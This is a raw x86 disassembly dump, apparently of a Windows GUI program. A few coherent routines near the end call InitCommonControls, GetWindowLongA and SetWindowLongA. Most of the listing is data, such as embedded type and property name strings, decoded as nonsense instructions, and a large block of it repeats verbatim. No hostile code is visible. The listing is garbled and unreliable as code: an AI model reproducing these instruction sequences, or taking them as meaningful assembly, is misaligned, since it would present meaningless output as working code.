add [ eax - 0x71 ] al
inc ebx
add [ edi + ecx * 4 + 0x43 ] bh
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_438d18
inc eax
lea eax [ ebx ]
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax - 0x10 ]
int3
add [ edi + ecx * 2 + 0x44 ] dh
add [ ebx ] cl
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
insb
cmp [ ebx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax + 0x6400438e ] bh
les eax [ eax + eax + 0x40 ]
test [ ebx ] al
adc al 0xc8
inc esp
inc eax
add [ edx + edi + 0x43 ] dh
add [ edi ] al
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
je r-xdata
insb
jae r-xdata
hlt
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a ] dl
inc ebx
add [ esi + 0x3a ] bl
inc ebx
add [ eax + 0x2 ] dl
add [ eax ] al
pop eax
aaa
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add [ esi + ecx * 8 + 0x44 ] dl
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
clc
add [ ebx ] 0xf4
std
inc esp
add [ esi + eax * 8 ] bl
inc esp
add [ ecx + ecx * 4 ] cl
inc ecx
add [ eax - 0x3bffbb55 ] dh
jg r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] al
test [ ebx + eax * 2 ] dh
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
xor [ edx ] 0x40
add [ esi ] cl
inc ebp
dec ebp
outsd
outsb
je r-xdata
add [ ebx + 0x433910c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
cmp [ ebx ] eax
or al 0x0
add [ ebp + ebp * 4 - 0x773bffbc ] ch
inc esp
add ah bh
jle r-xdata
jpe r-xdata
pushfd
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
cmp [ ebx ] eax
cwde
cmp [ ebx ] al
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
call eax
xchg [ ebx ] al
and [ ebp + 0x43 ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
pop es
inc ebp
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
jmp [ edx + ecx * 4 ]
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
dec ebp
outsd
pop esp
dec edx
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
insd
dec esi
popad
insd
mov al [ gs : 0x2800443b ]
add al [ eax ]
inc eax
xchg [ ebx ] eax
sub [ ebp + 0x43 ] al
add [ eax - 0x80000000 ] al
sbb eax 0x614d0700
js r-xdata
insb
inc ebx
add [ eax ] ah
add al [ eax ]
[ eax - 0x79 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
outsb
inc esp
popad
je r-xdata
add bh bh
rol [ esi - 0x7adfffbd ] 0x1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
xor eax 0x2080043
add bh bh
jl r-xdata
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] r--data
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul eax [ gs : eax ] 0x22
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff8438146
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] bl
add [ esi ] cl
dec ecx
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
push cs
push eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] dh
add al [ eax ]
[ eax + ecx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
jo r-xdata
outsb
je r-xdata
js r-xdata
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop ecx
add [ eax ] al
jmp [ eax ]
pop es
inc esp
add [ eax - 0xc ] bh
inc esp
add al bh
hlt
add [ esi + 0x2 ] al
add bh bh
je r-xdata
outsb
jne r-xdata
add [ eax ] eax
outsb
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
inc edi
add al [ eax ]
call [ esp + ecx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ eax ]
or edx [ edi + 0x65 ]
imul ecx [ gs : esi + 0x75 ] 0x6d
bound esp [ ebp + 0x72 ]
jae r-xdata
jpo r-xdata
inc ebx
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax - 0xaef0100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
outsd
popad
jns r-xdata
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
add al [ eax ]
call [ esp + ecx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
sub [ ebx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
inc ebp
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
imul esi [ edx + 0x63 ] 0x3b78656c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
popad
jns r-xdata
adc [ eax ] al
inc esi
add al [ eax ]
push [ esp + ecx * 4 + 0x43 ]
je r-xdata
outsb
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc edi
je r-xdata
add [ eax + 0x4f070032 ] al
adc al 0x56
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
xor [ ebx ] 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
aas
inc esp
add [ eax ] cl
jb r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
sub [ 0x6e4f0a00 ] 0x44
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9423f90
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
jb r-xdata
jo r-xdata
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
dec edi
outsb
dec ebx
jns r-xdata
je r-xdata
outsb
dec edi
jae r-xdata
dec edi
dec ecx
outsb
outsw
xor al 0x3e
inc esp
add al bl
add [ eax ] eax
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jmp [ ebx + rw-data ]
add bh bh
dec ebx
jns r-xdata
xor eax 0x6e4f0900
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
push ebx
je r-xdata
sbb [ edx + 0x41 ] 0x0
call sub_40b84c
call sub_403a44
pop ebx
retn
jb r-xdata
push ebx
je r-xdata
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
add [ eax + 0x4f060033 ] al
inc ebx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
outsb
add [ eax ] al
add [ edx + 0x74 ] dh
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
jo r-xdata
jb r-xdata
inc edi
add [ eax ] al
jne r-xdata
inc esp
jb r-xdata
[ eax ]
add [ eax + 0x4f0a002f ] al
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
0xffff
inc esp
outsd
arpl [ ebx - 0x5c ] bp
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bfe0
mov [ rw-data ] eax
lodsb [ esi ]
jbe r-xdata
sub_4339e2
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add [ eax ] dl
int1
inc esp
add ah cl
int1
inc esp
add al cl
in al dx
inc esp
add [ eax + 0x480044f1 ] dh
mov bl 0x44
add eax [ eax ]
inc ebx
popad
insb
outsb
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
add ah bl
mov ecx 0xc77c0044
inc esp
add [ eax + 0x6400438e ] bh
les eax [ eax + eax + 0x40 ]
test [ ebx ] al
adc al 0xc8
inc esp
add [ eax ] bl
enter 0x44 0xd0
mov [ eax + eax + 0x78 ] 0xc6
inc esp
add al dh
inc esp
add al al
rol [ eax + eax - 0x1c ] 0x1
add al 0x45
add [ edi + ebp * 8 + 0x44 ] ch
add [ edx + esi * 8 + 0x44 ] bl
add [ eax ] ch
add [ ebx ] 0x2c
add [ ebx ] 0x4
pop [ ebx ]
fadd [ ebx + eax * 2 + 0x438f0c00 ]
add [ eax - 0x71 ] al
inc ebx
add [ edi + ecx * 4 + 0x43 ] bh
add [ edx ] al
add [ esi ] cl
mov al 0x4e
mov esp sub_438d18
inc eax
lea eax [ ebx ]
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
inc eax
add [ edx + edi + 0x43 ] dh
add [ edi ] al
push cs
push esp
dec ebp
outsd
outsb
je r-xdata
jb r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
insb
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
inc ebx
popad
insb
outsb
popad
jb r-xdata
jpe r-xdata
pushfd
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x75410800
je r-xdata
cmp [ ebx ] eax
cwde
cmp [ ebx ] al
cmp al [ eax ]
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
fwait
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push cs
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
jae r-xdata
call eax
xchg [ ebx ] al
and [ ebp + 0x43 ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] al
pop es
inc ebp
jae r-xdata
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ edx + eax ] al
jmp [ edx + ecx * 4 ]
add [ eax + 0x430b0011 ] al
outsd
jb r-xdata
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
hlt
dec ebp
outsd
pop esp
dec edx
inc esp
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4907001c ] al
insd
dec esi
popad
insd
mov al [ gs : 0x2800443b ]
add al [ eax ]
inc eax
xchg [ ebx ] eax
sub [ ebp + 0x43 ] al
add [ eax - 0x80000000 ] al
sbb eax 0x614d0700
js r-xdata
insb
inc ebx
add [ eax ] ah
add al [ eax ]
[ eax - 0x79 ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
outsb
inc esp
popad
je r-xdata
add bh bh
rol [ esi - 0x7adfffbd ] 0x1
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x45070018 ] al
jb r-xdata
outsb
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] eax
or eax [ ebx + 0x6f ]
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5065646f
xor eax 0x2080043
add bh bh
jl r-xdata
pop ds
add [ edi ] al
dec ebp
imul ebp [ esi + 0x44 ] r--data
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
popad
je r-xdata
inc esi
imul esi [ edx + 0x73 ] 0x79614474
dec edi
push di
imul eax [ gs : eax ] 0x22
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff8438146
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4604001a ] al
outsd
outsb
je r-xdata
add [ eax ] al
add [ ecx ] bl
add [ esi ] cl
dec ecx
inc esp
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
sbb eax [ eax ]
pop es
dec ecx
insd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43090010 ] al
popad
insb
inc ebx
outsd
insb
outsd
push cs
push eax
popad
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] dh
add al [ eax ]
[ eax + ecx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090023 ] al
outsd
jo r-xdata
outsb
je r-xdata
js r-xdata
jo r-xdata
add [ eax ] al
and al [ eax ]
push cs
push eax
popad
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop ecx
add [ eax ] al
jmp [ eax ]
pop es
inc esp
add [ eax - 0xc ] bh
inc esp
add al bh
hlt
add [ esi + 0x2 ] al
add bh bh
je r-xdata
outsb
jne r-xdata
add [ eax ] eax
outsb
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] eax
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
inc edi
add al [ eax ]
call [ esp + ecx * 4 + 0x10043 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub al [ eax ]
or edx [ edi + 0x65 ]
imul ecx [ gs : esi + 0x75 ] 0x6d
bound esp [ ebp + 0x72 ]
jae r-xdata
jpo r-xdata
inc ebx
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080024 ] al
push 0x6948776f
outsb
je r-xdata
add [ ecx + eax - 0xaef0100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub [ eax ] al
outsd
popad
jns r-xdata
add [ eax ] al
and eax 0x68530900
outsd
ja r-xdata
add al [ eax ]
call [ esp + ecx * 4 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
sub [ ebx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
inc ebp
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
imul esi [ edx + 0x63 ] 0x3b78656c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] cl
push ebx
push 0x6f54776f
popad
jns r-xdata
adc [ eax ] al
inc esi
add al [ eax ]
push [ esp + ecx * 4 + 0x43 ]
je r-xdata
outsb
add [ eax ] al
js r-xdata
add [ eax ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
inc edi
je r-xdata
add [ eax + 0x4f070032 ] al
adc al 0x56
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090030 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] al
xor [ ebx ] 0x0
push es
dec edi
outsb
inc ebp
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
das
add [ edx ] cl
dec edi
aas
inc esp
add [ eax ] cl
jb r-xdata
outsd
outsb
je r-xdata
add [ eax ] al
sub [ 0x6e4f0a00 ] 0x44
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9423f90
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002e ] al
outsb
inc esp
jb r-xdata
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
jb r-xdata
jo r-xdata
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0039 ] al
cmp [ esi ] 0x44
add al ah
add [ eax ] eax
jmp eax
dec edi
outsb
dec ebx
jns r-xdata
je r-xdata
outsb
dec edi
jae r-xdata
dec edi
dec ecx
outsb
outsw
xor al 0x3e
inc esp
add al bl
add [ eax ] eax
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jmp [ ebx + rw-data ]
add bh bh
dec ebx
jns r-xdata
xor eax 0x6e4f0900
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0038 ] al
outsb
push ebx
je r-xdata
sbb [ edx + 0x41 ] 0x0
call sub_40b84c
call sub_403a44
pop ebx
retn
jb r-xdata
push ebx
je r-xdata
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or ecx [ edi + 0x6e ]
add [ eax + 0x4f060033 ] al
inc ebx
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0034 ] al
outsb
add [ eax ] al
add [ edx + 0x74 ] dh
xor al 0x3e
inc esp
add al ch
add [ eax ] eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push esi
jo r-xdata
jb r-xdata
inc edi
add [ eax ] al
jne r-xdata
inc esp
jb r-xdata
[ eax ]
add [ eax + 0x4f0a002f ] al
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
0xffff
inc esp
outsd
arpl [ ebx - 0x5c ] bp
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bfe0
mov [ rw-data ] eax
lodsb [ esi ]
jbe r-xdata
sub_434154
push ebx
add esp 0xfffffff8
mov [ esp ] 0x8
mov [ esp + 0x4 ] eax
mov eax esp
call sub_429608
cmp eax 0x1
sbb ebx ebx
inc ebx
test bl bl
jne r-xdata
mov eax ebx
pop ecx
pop edx
pop ebx
retn
call InitCommonControls
sub_434180
push ebx
mov ebx eax
mov eax ebx
call sub_434154
test al al
jne r-xdata
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_4341e0
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov edi edx
mov ebp eax
mov eax ebp
call sub_44f5e0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push 0xfffffff0
mov eax ebp
call sub_44f2dc
push eax
call GetWindowLongA
mov esi eax
test bl bl
jne r-xdata
or esi edi
not edi
and esi edi
jmp r-xdata
push esi
push 0xfffffff0
mov eax ebp
call sub_44f2dc
push eax
call SetWindowLongA
sub_434228
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x10 ] 0x32
mov [ esi + 0x18 ] 0x2710
mov [ esi + 0x1e ] 0x1
mov [ esi + 0x20 ] 0xffffffff
mov [ esi + 0x25 ] 0x1
xor edx edx
mov eax esi
call sub_418c64
mov eax esi
call sub_434328
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_434284
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_41890c
mov edi esi
mov edx [ edi + 0xc ]
mov eax ebx
call sub_434434
mov edx [ edi + 0x10 ]
mov eax ebx
call sub_43445c
mov edx [ edi + 0x14 ]
mov eax ebx
call sub_434408
mov edx [ edi + 0x18 ]
mov eax ebx
call sub_4343e4
mov dl [ edi + 0x1c ]
mov eax ebx
call sub_4343b4
mov dl [ edi + 0x1d ]
mov eax ebx
call sub_434424
mov al [ edi + 0x1e ]
mov [ ebx + 0x1e ] al
mov edx [ edi + 0x20 ]
mov eax ebx
call sub_4344a4
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_434328
